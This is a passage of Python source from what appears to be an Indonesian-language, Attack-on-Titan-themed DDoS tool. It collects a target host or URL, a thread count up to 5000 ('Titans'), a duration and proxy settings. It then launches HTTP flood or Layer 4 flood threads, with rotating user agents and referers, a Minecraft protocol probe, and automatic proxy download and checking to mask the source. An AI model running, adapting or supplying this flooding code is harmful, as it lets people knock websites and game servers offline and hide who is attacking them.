            rpc = input(f"{bcolors.WARNING}Requests per Connection (default 10): {bcolors.RESET}").strip()
            try:
                rpc = int(rpc) if rpc else 10
                if rpc <= 0:
                    raise ValueError
            except ValueError:
                print(f"{bcolors.FAIL}RPC tidak valid! Gunakan angka positif{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

            duration = input(f"{bcolors.WARNING}Durasi Rumbling (detik, default 60): {bcolors.RESET}").strip()
            try:
                duration = int(duration) if duration else 60
                if duration <= 0:
                    raise ValueError
            except ValueError:
                print(f"{bcolors.FAIL}Durasi tidak valid! Gunakan angka positif{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

            useragent_li = Path(__dir__ / "files/useragent.txt")
            referers_li = Path(__dir__ / "files/referers.txt")
            if not useragent_li.exists() or not referers_li.exists():
                print(f"{bcolors.FAIL}File useragent atau referer tidak ditemukan!{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

            uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
            referers = set(a.strip() for a in referers_li.open("r+").readlines())
            if not uagents or not referers:
                print(f"{bcolors.FAIL}File useragent atau referer kosong!{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

            ToolsConsole.bersihkan_layar()
            event = Event()
            event.clear()
            try:
                for thread_id in range(threads):
                    thread = HttpFlood(thread_id, url, target_host, method, rpc, event, uagents, referers, proxies)
                    thread.start()
            except RuntimeError as e:
                print(f"{bcolors.FAIL}Gagal memulai, Titan: {str(e)}. Kurangi jumlah Titan (disarankan <1000) atau periksa batas sistem.{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

        else:
            target = input(f"{bcolors.WARNING}Tetapkan Target (e.g., 192.168.1.1:80): {bcolors.RESET}").strip()
            if not target:
                print(f"{bcolors.FAIL}Tidak ada sasaran ditentukan!{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return
            try:
                if ":" in target:
                    host, port = target.split(":")
                    target_port = int(port)
                else:
                    host, target_port = target, 80
                target_host = gethostbyname(host)
                if not 1 <= target_port <= 65535:
                    raise ValueError
            except (ValueError, Exception) as e:
                print(f"{bcolors.FAIL}Sasaran atau port tidak valid: {str(e)}{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

            threads = input(f"{bcolors.WARNING}Jumlah Titan (1-5000, default 50): {bcolors.RESET}").strip()
            try:
                threads = int(threads) if threads else 50
                if not 1 <= threads <= 5000:
                    raise ValueError
                if threads > 1000:
                    print(f"{bcolors.WARNING}PERINGATAN: Jumlah Titan {threads} tinggi! Disarankan <1000 untuk stabilitas sistem.{bcolors.RESET}")
            except ValueError:
                print(f"{bcolors.FAIL}Jumlah titan tidak valid! Gunakan angka antara 1 dan 5000{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

            duration = input(f"{bcolors.WARNING}Durasi Rumbling (detik, default 60): {bcolors.RESET}").strip()
            try:
                duration = int(duration) if duration else 60
                if duration <= 0:
                    raise ValueError
            except ValueError:
                print(f"{bcolors.FAIL}Durasi tidak valid! Gunakan angka positif{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

            use_proxies = input(f"{bcolors.WARNING}Gunakan proxy? (y/n): {bcolors.RESET}").strip().lower() == 'y'
            proxies = None
            proxy_count = 0
            socks_type = 0
            if use_proxies:
                socks_type = input(f"{bcolors.WARNING}Tipe Proxy (0=ALL, 1=HTTP, 4=SOCKS4, 5=SOCKS5, 6=RANDOM): {bcolors.RESET}").strip()
                try:
                    socks_type = int(socks_type)
                    if socks_type not in {0, 1, 4, 5, 6}:
                        raise ValueError
                except ValueError:
                    print(f"{bcolors.FAIL}Proxy tidak valid! Gunakan 0, 1, 4, 5, atau 6{bcolors.RESET}")
                    input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                    return

                proxy_file = input(f"{bcolors.WARNING}File Proxy (e.g., proxies.txt): {bcolors.RESET}").strip()
                if not proxy_file:
                    print(f"{bcolors.WARNING}Tidak ada file proxy ditentukan, melanjutkan tanpa proxy{bcolors.RESET}")
                else:
                    proxy_li = Path(__dir__ / "files/proxies" / proxy_file)
                    if not proxy_li.exists():
                        print(f"{bcolors.FAIL}File {proxy_file} tidak ditemukan!{bcolors.RESET}")
                        input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                        return
                    proxies = handleProxyList(con, proxy_li, socks_type)
                    proxy_count = len(proxies) if proxies else 0

            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
            if method == "BEAST_ROAR":
                try:
                    with socket(AF_INET, SOCK_STREAM) as s:
                        s.connect((target_host, target_port))
                        Tools.kirim(s, Minecraft.jabat_tangan((target_host, target_port), protocolid, 1))
                        Tools.kirim(s, Minecraft.data(b'\x00'))
                        response = s.recv(1024)
                        match = Tools.protocolRex.search(str(response))
                        protocolid = int(match.group(1)) if match else con["MINECRAFT_DEFAULT_PROTOCOL"]
                        if not 47 <= protocolid <= 758:
                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                except Exception:
                    protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]

            ToolsConsole.bersihkan_layar()
            event = Event()
            event.clear()
            try:
                for _ in range(threads):
                    thread = Layer4((target_host, target_port), method, event, proxies, protocolid)
                    thread.start()
            except RuntimeError as e:
                print(f"{bcolors.FAIL}Gagal memulai Titan: {str(e)}. Kurangi jumlah Titan (disarankan <1000) atau periksa batas sistem.{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

        logger.info(
            f"{bcolors.WARNING}Titan dikerahkan melawan{bcolors.OKBLUE} {target_host}{bcolors.WARNING} dengan strategi{bcolors.OKBLUE} {method}{bcolors.WARNING} selama{bcolors.OKBLUE} {duration}{bcolors.WARNING} detik, titan:{bcolors.OKBLUE} {threads}{bcolors.RESET}")
        event.set()
        ts = time()
        monitor_thread = Thread(target=ToolsConsole.pantau_rumbling, args=(target_host, target_port, method, duration, ts, event), daemon=True)
        monitor_thread.start()
        try:
            while time() < ts + duration and event.is_set():
                sleep(0.1)
        except KeyboardInterrupt:
            event.clear()
            print(f"\n{bcolors.OKCYAN}Rumbling dihentikan...{bcolors.RESET}")
            logger.info("Rumbling dihentikan oleh pengguna")
            sleep(0.5)
            return
        finally:
            event.clear()
            print(f"\n{bcolors.OKGREEN}Rumbling selesai.{bcolors.RESET}")
            logger.info("Rumbling selesai")
            input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")

    @staticmethod
    def hentikan():
        logger.info(f"{bcolors.OKGREEN}Semua pasukan Titan dihentikan!{bcolors.RESET}")
        from psutil import process_iter
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

def handleProxyList(con, proxy_li, proxy_ty, url=None):
    if proxy_ty not in {0, 1, 4, 5, 6}:
        exit("Proxy Tidak Valid [0, 1, 4, 5, 6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([1, 4, 5])
    if not proxy_li.exists():
        logger.warning(
            f"{bcolors.WARNING}File proxy tidak ada, membuat proxy baru...{bcolors.RESET}")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.unduh_dari_konfig(con, proxy_ty)
            logger.info(
                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxy sedang diperiksa, ini mungkin memakan waktu!{bcolors.RESET}")
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=5, threads=100,
                url=url.human_repr() if url else "http://httpbin.org/get",
            )
            if not Proxies:
                exit("Pemeriksaan Proxy gagal. Jaringan atau sasaran mungkin down.")
            stringBuilder = ""
            for proxy in Proxies:
                stringBuilder += (proxy.__str__() + "\n")
            wr.write(stringBuilder)

    proxies = ProxyUtiles.readFromFile(proxy_li)
    if proxies:
        logger.info(f"{bcolors.WARNING}Jumlah Proxy: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
    else:
        logger.info(
            f"{bcolors.WARNING}Tidak ada Proxy tersedia, melanjutkan tanpa proxy{bcolors.RESET}")
        proxies = None

    return proxies

if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        if len(argv) > 1:
            cmd = argv[1].upper()
            if cmd == "TOOLS":
                ToolsConsole.jalankan_konsol()
            elif cmd == "STOP":
                ToolsConsole.hentikan()
            else:
                ToolsConsole.tampilkan_banner(0)
                print(f"{bcolors.FAIL}Perintah tidak valid! Jalankan tanpa argumen untuk konsol.{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
        else:
            ToolsConsole.jalankan_konsol()
